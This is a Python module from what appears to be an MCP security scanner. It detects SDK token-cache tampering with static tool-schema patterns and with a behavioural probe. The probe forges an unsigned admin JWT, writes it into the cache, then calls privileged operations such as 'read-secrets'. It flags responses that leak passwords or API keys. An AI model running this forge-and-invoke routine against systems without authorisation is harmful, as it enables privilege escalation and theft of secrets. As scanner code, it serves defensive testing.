"""SDK token cache tamper detection (MCP-T33, Lane 1 / Transport C).

An in-process SDK wrapper that caches JWTs without re-validating the
signature allows an attacker with tool-call access to inject a forged
token granting an elevated role, then invoke privileged operations as
an admin — all without a valid credential.

Two checks:
  check_sdk_cache_tamper   (static)    — schema-level detection of
      writable-cache / cache-invoke tool pairs.
  check_sdk_cache_poisoning (behavioral) — full two-step proof-of-concept:
      write forged admin JWT → invoke privileged op → flag CRITICAL if
      the response contains sensitive data.

Taxonomy : MCP-T33 | OWASP MCP04
Lane     : 1 (Human Direct)
Transport: C (In-process SDK / library)

The lane/transport combination reflects the attack surface: the
vulnerability lives in the SDK layer that the *human-direct* agent
relies on, not on the MCP wire (A) or HTTP API (B).
"""

from __future__ import annotations

import base64
import json
import logging
import re
import time

from mcpnuke.checks._lane_helpers import lane_tagged
from mcpnuke.checks.base import time_check
from mcpnuke.checks.tool_probes import _call_tool, _response_text, _should_invoke
from mcpnuke.core.models import TargetResult

logger = logging.getLogger("mcpnuke.checks.sdk_cache_tamper")

# Pre-fill Lane 1 / Transport C on every emission from this module.
_add = lane_tagged(lane=1, transport="C")

# ── Pattern library ──────────────────────────────────────────────────────────

# Tools that write to an SDK token cache (the "write" half of the attack chain).
_CACHE_WRITE_NAME_RE = re.compile(
    r"(write|set|update|inject|poison)[_.]?(cache|token)"
    r"|cache[_.]?(write|set|update|inject)"
    r"|(write|set)[_.]?token"
    r"|token[_.]?(write|set)",
    re.IGNORECASE,
)
_CACHE_WRITE_DESC_RE = re.compile(
    r"write[s]?\s+(to\s+)?(the\s+)?cache"
    r"|overwrite[s]?\s+.*token"
    r"|inject[s]?\s+.*token"
    r"|cache\s+.*tamper"
    r"|sdk\s+(token\s+)?cache",
    re.IGNORECASE,
)

# Tools that invoke operations using the cached token (the "invoke" half).
_CACHE_INVOKE_NAME_RE = re.compile(
    r"invoke[_.]?as[_.]?cached"
    r"|as[_.]?cached"
    r"|cached[_.]?invoke"
    r"|execute[_.]?cached"
    r"|call[_.]?cached",
    re.IGNORECASE,
)
_CACHE_INVOKE_DESC_RE = re.compile(
    # Require an action verb + "cached" so that read-only tools like
    # "get_cached_token" (desc: "Return the current cached token") are not
    # matched — the bare "cached token" phrase is too broad.
    r"using\s+(the\s+)?cached"
    r"|invoke[s]?\s+(a\s+)?privileged",
    re.IGNORECASE,
)

# Operations to try when probing an invoke tool; tried in order of privilege.
_PRIVILEGED_OPERATIONS = [
    "admin-reset",
    "read-secrets",
    "admin",
    "reset",
    "root",
    "read-config",
]

# Markers in an invoke response that confirm privilege escalation succeeded.
_SENSITIVE_RESPONSE_RE = re.compile(
    r"db_password|api_key|reset_token|gateway_url"
    r"|access[_\s]granted"
    r"|privileged[_\s]granted"
    r"|\"admin\"\s*:\s*true",
    re.IGNORECASE,
)


# ── Helpers ──────────────────────────────────────────────────────────────────


def _forge_admin_jwt() -> str:
    """Build a forged JWT claiming role=admin with a far-future expiry.

    The signature is intentionally invalid (not signed with the server's
    secret).  A properly configured SDK must reject this token.  An SDK
    that trusts ``cached_role`` blindly (easy difficulty) or only checks
    ``exp`` without validating the signature (medium difficulty) will
    accept it — both are the vulnerability this check targets.
    """
    hdr = base64.urlsafe_b64encode(
        b'{"alg":"HS256","typ":"JWT"}'
    ).rstrip(b"=").decode()
    payload_data = {
        "sub": "mcpnuke-probe",
        "role": "admin",
        "iss": "mcpnuke-security-test",
        # Far-future expiry bypasses ``exp``-only checks.
        "exp": int(time.time()) + 86_400 * 365,
        "iat": int(time.time()),
    }
    pld = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).rstrip(b"=").decode()
    sig = base64.urlsafe_b64encode(b"mcpnuke-probe-fake-sig").rstrip(b"=").decode()
    return f"{hdr}.{pld}.{sig}"


def _find_cache_write_tool(tools: list[dict]) -> dict | None:
    """Return the first tool that exposes writable SDK token-cache access."""
    for tool in tools:
        name = tool.get("name", "")
        desc = tool.get("description", "")
        props = tool.get("inputSchema", {}).get("properties", {})
        param_names = {k.lower() for k in props}

        name_match = bool(_CACHE_WRITE_NAME_RE.search(name))
        desc_match = bool(_CACHE_WRITE_DESC_RE.search(desc))
        has_token_param = bool(param_names & {"token", "jwt", "bearer", "cached_token"})

        if (name_match or desc_match) and has_token_param:
            return tool

        # Strong signal: tool accepts BOTH a token AND a role override.
        if "token" in param_names and param_names & {"cached_role", "role"}:
            return tool

    return None


def _find_cache_invoke_tool(tools: list[dict]) -> dict | None:
    """Return the first tool that invokes operations using a cached token."""
    for tool in tools:
        name = tool.get("name", "")
        desc = tool.get("description", "")
        if _CACHE_INVOKE_NAME_RE.search(name) or _CACHE_INVOKE_DESC_RE.search(desc):
            return tool
    return None


def _pick_invoke_args(invoke_tool: dict) -> dict:
    """Build the most privileged argument set the invoke tool accepts."""
    props = invoke_tool.get("inputSchema", {}).get("properties", {})
    args: dict = {}
    if "operation" in props:
        enum_vals = props["operation"].get("enum", [])
        for op in _PRIVILEGED_OPERATIONS:
            if not enum_vals or op in enum_vals:
                args["operation"] = op
                break
        if "operation" not in args:
            args["operation"] = "admin-reset"
    return args


# ── Static check ──────────────────────────────────────────────────────────────


def check_sdk_cache_tamper(result: TargetResult) -> None:
    """Static: flag tools exposing a writable SDK token cache (MCP-T33).

    Emits HIGH when a writable-cache tool is detected and CRITICAL when
    the matching invoke tool is also present (full attack chain available
    without any network interaction).
    """
    with time_check("sdk_cache_tamper", result):
        write_tool = _find_cache_write_tool(result.tools)
        invoke_tool = _find_cache_invoke_tool(result.tools)

        if not write_tool:
            return

        write_name = write_tool.get("name", "")
        write_desc = write_tool.get("description", "")[:120]

        _add(
            result,
            "sdk_cache_tamper",
            "HIGH",
            f"Writable SDK token cache exposed via '{write_name}'",
            (
                f"Tool '{write_name}' accepts a token parameter with writable cache "
                "access. An attacker who can call this tool can inject a forged JWT "
                "and invoke privileged operations without a valid credential (MCP-T33)."
            ),
            evidence=f"name={write_name!r} desc={write_desc!r}",
            taxonomy_id="MCP-T33",
        )

        if invoke_tool:
            invoke_name = invoke_tool.get("name", "")
            _add(
                result,
                "sdk_cache_tamper",
                "CRITICAL",
                f"SDK cache-poison chain: '{write_name}' → '{invoke_name}'",
                (
                    "Both a cache-write tool and a cache-invoke tool are present. "
                    "A two-step attack — forge token, invoke privileged operation — "
                    "is completeable without any credential (MCP-T33, easy/medium "
                    "difficulty tiers accept unsigned JWTs with a far-future exp)."
                ),
                evidence=f"write={write_name!r} invoke={invoke_name!r}",
                taxonomy_id="MCP-T33",
            )


# ── Behavioral check ──────────────────────────────────────────────────────────


def check_sdk_cache_poisoning(
    session,
    result: TargetResult,
    probe_opts: dict | None = None,
) -> None:
    """Behavioral: attempt a full SDK cache-poisoning cycle (MCP-T33).

    Step 1 — write a forged admin JWT (unsigned, far-future exp) via the
    cache-write tool.
    Step 2 — invoke a privileged operation via the cache-invoke tool.

    Flags CRITICAL if step 2 returns sensitive data (db_password, api_key,
    reset_token, etc.), confirming the SDK accepted the forged credential.
    Flags HIGH if the write was accepted but the invoke response is ambiguous
    (no explicit denial), warranting manual review.
    """
    opts = probe_opts or {}
    _log = opts.get("_log", lambda msg: None)

    with time_check("sdk_cache_poisoning", result):
        write_tool = _find_cache_write_tool(result.tools)
        invoke_tool = _find_cache_invoke_tool(result.tools)

        if not write_tool or not invoke_tool:
            return
        if not _should_invoke(write_tool, opts) or not _should_invoke(invoke_tool, opts):
            return

        write_name = write_tool.get("name", "")
        invoke_name = invoke_tool.get("name", "")
        forged = _forge_admin_jwt()

        _log(
            f"    [dim]    sdk_cache_poisoning: writing forged admin JWT via '{write_name}'[/dim]"
        )

        # Step 1: inject forged JWT
        write_resp = _call_tool(
            session, write_name, {"token": forged, "cached_role": "admin"}, timeout=10
        )
        write_text = _response_text(write_resp) or ""

        # Server-side guard rejected the write entirely — no poisoning possible.
        if (
            "permission" in write_text.lower()
            or "forbidden" in write_text.lower()
            or "unauthorized" in write_text.lower()
        ):
            logger.debug(
                "sdk_cache_poisoning: write rejected by server (%r)", write_text[:80]
            )
            return

        # Step 2: invoke privileged operation using poisoned cache
        invoke_args = _pick_invoke_args(invoke_tool)
        _log(
            f"    [dim]    sdk_cache_poisoning: invoking '{invoke_name}' "
            f"with {invoke_args}[/dim]"
        )

        invoke_resp = _call_tool(session, invoke_name, invoke_args, timeout=10)
        invoke_text = _response_text(invoke_resp) or ""

        if _SENSITIVE_RESPONSE_RE.search(invoke_text):
            _add(
                result,
                "sdk_cache_poisoning",
                "CRITICAL",
                f"SDK cache poisoning confirmed: forged JWT accepted by '{invoke_name}'",
                (
                    f"Wrote a forged JWT (no valid signature, role=admin) via "
                    f"'{write_name}', then invoked '{invoke_name}' — response "
                    "contains privileged data. The SDK cache accepts tokens "
                    "without signature validation (MCP-T33)."
                ),
                evidence=f"invoke_response={invoke_text[:400]}",
                taxonomy_id="MCP-T33",
            )
        elif (
            invoke_text
            and "denied" not in invoke_text.lower()
            and "error" not in invoke_text.lower()
        ):
            _add(
                result,
                "sdk_cache_poisoning",
                "HIGH",
                f"SDK cache write accepted; invoke response did not deny access for '{invoke_name}'",
                (
                    f"Forged JWT was written via '{write_name}' without error. "
                    f"'{invoke_name}' did not explicitly deny the privileged call — "
                    "manual verification recommended (MCP-T33)."
                ),
                evidence=f"invoke_response={invoke_text[:200]}",
                taxonomy_id="MCP-T33",
            )
        else:
            logger.debug(
                "sdk_cache_poisoning: invoke denied or errored (%r)", invoke_text[:100]
            )
